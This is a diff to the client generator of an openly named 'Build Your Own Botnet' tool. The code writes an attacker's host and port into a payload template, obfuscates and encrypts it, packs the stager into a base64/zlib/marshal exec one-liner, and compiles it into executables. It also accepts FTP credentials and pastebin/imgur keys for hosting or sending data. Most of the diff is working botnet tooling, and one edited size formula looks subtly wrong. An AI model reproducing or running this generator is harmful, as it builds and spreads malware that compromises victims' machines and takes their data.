@@ -202,7 +202,7 @@ def app(options, filename):
     except Exception as e:
         globals()['_logger'].error('Method {} returned error: {}'.format(app.func_name, str(e)))
 
-def run(options, payload='clients/payload.py', stager='clients/stager.py'):
+def run(options, payload='clients/templates/payload.py', stager='clients/templates/stager.py'):
     """
     Generate the main Python stager
 
@@ -220,7 +220,7 @@ def run(options, payload='clients/payload.py', stager='clients/stager.py'):
     payload = open(payload, 'r').read().replace('__KWARGS__', ', '.join(["host='{}', port={}".format(options.host, options.port), "ftp={}".format(json.dumps({'host': options.ftp_host, 'user': options.ftp_user, 'password': options.ftp_passwd}) if bool(options.ftp_host and options.ftp_user and options.ftp_passwd) else '', "pastebin='{}'".format(options.pastebin) if options.pastebin else '', "imgur='{}'".format(options.imgur) if options.imgur else '')]))
 
     if options.obfuscate:
-        temp = tempfile.NamedTemporaryFile(prefix='byob_', suffix='.py', dir=os.path.abspath('payloads'), delete=False)
+        temp = tempfile.NamedTemporaryFile(prefix='byob_', suffix='.py', delete=False)
         temp.file.write(payload)
         temp.file.close()
         obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-functions --obfuscate-variables --obfuscate-builtins --replacement-length=1 {}'.format(temp.name, temp.name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
@@ -265,7 +265,7 @@ def run(options, payload='clients/payload.py', stager='clients/stager.py'):
             return
     else:
         url  = 'http://{}:{}/clients/{}'.format(options.host, options.port, client.name)
-        temp = tempfile.NamedTemporaryFile(prefix='payload', suffix='.py', dir=os.path.abspath('payloads'), delete=False)
+        temp = tempfile.NamedTemporaryFile(prefix='payload', suffix='.py', dir='clients', delete=False)
         temp.file.write(payload)
         temp.file.close()
         util.display("[+] ", color='green', style='bright', end='')
@@ -292,7 +292,7 @@ def run(options, payload='clients/payload.py', stager='clients/stager.py'):
 
     if options.compress:
         code = "import zlib,base64,marshal;exec marshal.loads(zlib.decompress(base64.b64decode({})))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
-        diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
+        diff = round(float(100.0 * float(float(len(code))/float(len(payload)) - 1.0)))
         util.display("[+] ", color='green', style='bright', end='')
         util.display("Stager compression complete", color='reset', style='bright')
         util.display("    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if len(code) > len(stager) else 'reduced', len(code), diff, 'larger' if len(code) > len(stager) else 'smaller').ljust(80 - len("[+] ")), color='reset', style='dim')
@@ -306,39 +306,90 @@ def run(options, payload='clients/payload.py', stager='clients/stager.py'):
     util.display("Client generation complete", color='reset', style='bright')
     util.display( "    (saved to file: {})".format(client.name).ljust(80 - len("[+] ")), style='dim', color='reset')
     if options.compile:
-         return exe(options, client.name)
+        if sys.platform == 'darwin':
+            return app(options, client.name)
+        return exe(options, client.name)
     return client.name
 
 def main():
+    # command line argument parser
     parser = argparse.ArgumentParser(prog='client.py', description="Client Generator (Build Your Own Botnet)", version='0.1.3')
 
-    # required arguments
-    parser.add_argument('host', action='store', type=str, help='server IP to connect to', default='localhost')
-    parser.add_argument('port', action='store', type=int, help='port number for connection', default=1337)
-
     # optional arguments
-    parser.add_argument('--debug', action='store_true', help='Debugging mode', default=False)
-    parser.add_argument('--icon', action='store', type=str, help='icon for output file (requires --compile)')
-    parser.add_argument('--upload', action='store_true', help='upload & host payload on pastebin (requires --pastebin)', default=False)
-    parser.add_argument('--encrypt', action='store_true', help='encrypt payload & only decrypt in-memory at run-time', default=False)
-    parser.add_argument('--obfuscate', action='store_true', help='obfuscate names of classes, functions, variables, etc.', default=False)
-    parser.add_argument('--compress', action='store_true', help='compress .py into .pyz (self-extracting archive)', default=False)
-    parser.add_argument('--compile', action='store_true', help='compile .py/.pyz into .exe (standalone executable)', default=False)
+    parser.add_argument('host', 
+                        action='store', 
+                        type=str, 
+                        help='server IP to connect to', 
+                        default='localhost')
+    parser.add_argument('port', 
+                        action='store', 
+                        type=int, 
+                        help='server port number', 
+                        default=1337)
+    parser.add_argument('--upload', 
+                        action='store_true', 
+                        help='upload & host payload on pastebin (requires --pastebin)', 
+                        default=False)
+    parser.add_argument('--encrypt', 
+                        action='store_true', 
+                        help='encrypt payload (decrypts & runs without touching disk)', 
+                        default=False)
+    parser.add_argument('--obfuscate', 
+                        action='store_true', 
+                        help='obfuscate names of classes, functions, variables, etc.', 
+                        default=False)
+    parser.add_argument('--compress', 
+                        action='store_true', 
+                        help='zip-compress into a self-executing python script', 
+                        default=False)
+    parser.add_argument('--compile', 
+                        action='store_true', 
+                        help='compile into a standalone bundled executable', 
+                        default=False)
+    parser.add_argument('--debug', 
+                        action='store_true',
+                        help='print debugging output to the console',
+                        default=False)
 
     # credentials
     creds = parser.add_argument_group('credentials')
     creds.title = 'optional credentials'
-    creds.add_argument('--ftp-host', action='store', metavar='HOST', help='FTP server host')
-    creds.add_argument('--ftp-user', action='store', metavar='USER', help='FTP login username')
-    creds.add_argument('--ftp-passwd', action='store', metavar='PASSWD', help='FTP login password')
+
+    creds.add_argument('--ftp-host', 
+                        action='store', 
+                        metavar='HOST', 
+                        help='FTP server host')
+    creds.add_argument('--ftp-user', 
+                        action='store', 
+                        metavar='USER', 
+                        help='FTP login username')
+    creds.add_argument('--ftp-passwd', 
+                        action='store', 
+                        metavar='PASSWD', 
+                        help='FTP login password')
 
     # api keys
     api  = parser.add_argument_group('api')
     api.title = 'optional api keys'
-    api.add_argument('--imgur', action='store', type=str, metavar='API', help='imgur api key')
-    api.add_argument('--pastebin', action='store', type=str, metavar='API', help='pastebin api key')
-    api.add_argument('--vultr', action='store', type=str, metavar='API', help='vultr api key')
+
+    api.add_argument('--imgur', 
+                        action='store', 
+                        type=str, 
+                        metavar='API', 
+                        help='imgur api key')
+    api.add_argument('--pastebin', 
+                        action='store', 
+                        type=str, 
+                        metavar='API', 
+                        help='pastebin api key')
+    api.add_argument('--vultr', 
+                        action='store', 
+                        type=str, 
+                        metavar='API', 
+                        help='vultr api key')
+
     options = parser.parse_args()
+    globals()['_debug'] = options.debug
     globals()['_logger'].setLevel(logging.DEBUG if options.debug else logging.ERROR)
     return run(options)
 
